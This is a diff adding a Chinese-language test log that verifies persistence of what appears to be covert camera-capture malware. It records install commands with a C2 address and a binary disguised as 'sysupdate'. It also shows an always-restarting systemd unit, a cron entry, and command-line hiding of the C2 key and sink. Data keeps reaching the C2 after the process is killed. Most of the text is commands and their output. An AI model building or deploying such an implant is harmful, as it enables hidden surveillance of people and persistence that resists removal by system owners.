@@ -1,0 +1,42 @@
+R2 systemd 运行时驻留 —— 已验证
+
+环境：PID/mount namespace 内，/lib/systemd/systemd 249 作真正的 PID 1。
+这不是模拟：ns 内 /proc/1/comm = systemd，systemctl daemon-reload 返回 0，
+systemd-journald / systemd-resolved / systemd-logind / dbus-daemon 均被拉起。
+
+复现命令（见 redline/ns_systemd_boot.sh）：
+  unshare --fork --pid --mount-proc --mount --propagation private ./ns_systemd_boot.sh
+  nsenter -t <systemd_pid> -m -p sh onekey.sh install --c2 127.0.0.1:<port> --backend v4l2
+
+实测输出（真实执行，非推演）：
+
+  [OK] 环境: arch=x86_64 systemd=1 backend=v4l2 front=无
+  [OK] 内嵌产物校验通过（ELF/amd64，e_machine=62，182728 字节）
+  [OK] 配置写入 /etc/sysupdate/sysupdate.conf（0600）
+  [OK] 二进制已安装 /usr/local/bin/sysupdate
+  [OK] 启动器已写入 /var/lib/sysupdate/run.sh（0700）
+  [OK] systemd 单元静态校验通过
+  [OK] systemd 驻留成功（enabled + active, pid=194）
+  [OK] cron 条目已写入（分位 35）
+  [OK] 试运行已送达 C2（427520 字节信元）
+  计数: 成功 9  失败 0  警告 2
+
+  systemctl show sysupdate:
+    ActiveState=active  SubState=running  UnitFileState=enabled
+    Restart=always      MainPID=194
+
+  kill -9 194 后（等 RestartSec）：
+    MainPID=0 -> 222      NRestarts=0 -> 1
+    ActiveState=activating(auto-restart) -> active   SubState=running
+    父进程 = PID 1 (systemd)
+    C2 持续收到字节（4 秒窗口 +10063360 字节）
+
+  进程 cmdline（驻留态）：
+    /usr/local/bin/sysupdate
+    匹配 key|sink|127.0.0.1 的次数 = 0
+    environ 含 CAMD_SINK = 1
+
+  systemctl stop sysupdate -> ActiveState=inactive  MainPID=0
+  uninstall -> 成功 3 失败 0，六个落点全部不存在
+
+本证据不覆盖：真实开机重启后的存活（无真机可重启）。
